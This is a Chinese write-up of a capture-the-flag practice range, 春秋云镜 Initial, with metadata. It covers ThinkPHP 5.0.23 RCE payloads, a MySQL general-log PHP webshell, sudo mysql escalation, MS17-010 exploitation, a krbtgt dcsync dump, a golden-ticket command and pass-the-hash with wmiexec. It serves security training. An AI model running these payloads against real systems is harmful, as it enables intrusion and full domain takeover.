---
title: 春秋云镜-Initial打靶记录
contest: 春秋云镜靶场
year: 2024
difficulty: easy
vuln_type: rce
tags: [ThinkPHP 5.0.23, sudo mysql提权, 信呼OA, phpMyAdmin日志写马, MS17-010, 黄金票据, Kerberos]
attack_chain: ThinkPHP5023 RCE→写入一句话→蚁剑→sudo mysql -e提权flag1→frp代理→信呼OA+phpMyAdmin写shell flag2→MS17-010打WIN7→kiwi dcsync导出krbtgt hash→伪造黄金票据→wmiexec登录DC读flag3
key_payload: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;set global general_log='ON';set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';select '<?php eval($_POST[cmd]);?>';kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt"
one_liner: 春秋云镜Initial完整打靶：ThinkPHP+信呼OA+MS17-010+黄金票据四步全flag
lesson: 入门靶场三种getshell姿势（ThinkPHP/信呼上传/phpMyAdmin日志写马）+ Kerberos黄金票据原理与利用
quality: high
---

# 春秋云镜-Initial打靶记录

**靶场**：春秋云镜Initial（弱口令安全实验室，2024年4月）

**完整打靶四步走**：

**1. ThinkPHP 5.0.23 RCE入口（39.99.246.97）**
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php phpinfo();?>" > info.php
```
- 蚁剑连接 → www-data权限
- `sudo -l` → mysql nopasswd root
- `sudo mysql -e '! find / -name flag'` → /root/flag/flag01.txt

**2. 内网扫描+代理（frp/neoreg）**
- fscan扫内网 172.22.1.0/24
- 发现：172.22.1.2(DC01) / 172.22.1.18(信呼OA) / 172.22.1.21(MS17-010)

**3. 信呼OA+phpMyAdmin写webshell（172.22.1.18）**
- dirsearch扫出phpMyAdmin → root/root弱口令
- MySQL日志写马：
  ```sql
  set global general_log = "ON";
  set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';
  select '<?php eval($_POST[cmd]);?>';
  ```
- 连接为system权限 → 读flag02.txt

**4. 永恒之蓝+黄金票据（172.22.1.21 → 172.22.1.2）**
- `proxychains msfconsole` + `exploit/windows/smb/ms17_010_eternalblue`
- 成功后 `load kiwi`
- `kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:krbtgt"` 导出krbtgt hash: `fb812eea13a18b7fcdb8e6d67ddc205b`
- **伪造黄金票据**：
  ```
  kerberos::golden /user:administrator /domain:xiaorang.lab 
    /sid:S-1-5-21-314492864-3856862959-4045974917-502 
    /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt
  ```
- `wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type Users\Administrator\flag\flag03.txt"`

**黄金票据原理**：
- KDC = AS(身份验证) + TGS(票据授权)
- krbtgt账户NTLM Hash固定 → 拿到后可伪造TGT，跳过AS验证
- 利用条件：域名称 + 域SID + krbtgt NTLM Hash

**质量评估**：高（三种getshell姿势 + Kerberos原理 + 黄金票据利用，命令级payload完整）
